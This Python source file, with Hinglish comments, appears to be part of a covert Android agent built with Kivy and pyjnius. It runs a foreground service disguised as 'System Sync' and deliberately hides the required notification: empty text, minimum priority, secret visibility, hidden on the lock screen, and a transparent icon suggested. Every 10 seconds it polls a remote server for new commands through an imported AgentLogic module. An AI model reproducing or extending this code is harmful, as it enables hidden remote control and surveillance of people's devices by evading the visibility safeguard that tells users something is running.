import asyncio
from jnius import autoclass, cast

def start_foreground_notification() -> None:
    PythonService = autoclass("org.kivy.android.PythonService")
    service = PythonService.mService

    Build = autoclass("android.os.Build")
    Context = autoclass("android.content.Context")
    NotificationManager = autoclass("android.app.NotificationManager")
    NotificationChannel = autoclass("android.app.NotificationChannel")
    Builder = autoclass("androidx.core.app.NotificationCompat$Builder")
    R = autoclass("org.kivy.android.R")

    # Sabse pehle channel ID badlo taaki purani settings reset ho jayein
    channel_id = "system_sync_service_v2" 
    channel_name = "System Sync"

    if Build.VERSION.SDK_INT >= 26:
        manager = cast("android.app.NotificationManager", service.getSystemService(Context.NOTIFICATION_SERVICE))
        # IMPORTANCE_MIN (0) use kiya hai taaki sound ya pop-up na aaye
        importance = 0 
        channel = NotificationChannel(channel_id, channel_name, importance)
        channel.setDescription("System background synchronization")
        # Lock screen par notification hide karne ke liye
        channel.setLockscreenVisibility(-1) 
        manager.createNotificationChannel(channel)

    # Building Invisible Notification
    notification = (
        Builder(service, channel_id)
        .setContentTitle("") # Khali rakha hai taaki kuch dikhe nahi
        .setContentText("") 
        .setSmallIcon(R.drawable.icon) # Is icon ko transparent icon se replace kar sakte ho buildozer mein
        .setOngoing(True)
        .setPriority(-2) # PRIORITY_MIN: Status bar se icon gayab kar deta hai
        .setVisibility(-1) # VISIBILITY_SECRET
        .build()
    )

    # Start service in background
    service.startForeground(1001, notification)

async def run_loop():
    # Yahan hum AgentLogic ko connect karenge
    from agent_logic import AgentLogic
    agent = AgentLogic()
    
    while True:
        try:
            # Har 10 second mein Pune server se naya command check karega
            await agent.run_once() 
        except Exception as e:
            print(f"Connection lost, retrying... {e}")
        await asyncio.sleep(10)

if __name__ == "__main__":
    start_foreground_notification()
    # Asynchronous loop start
    asyncio.run(run_loop())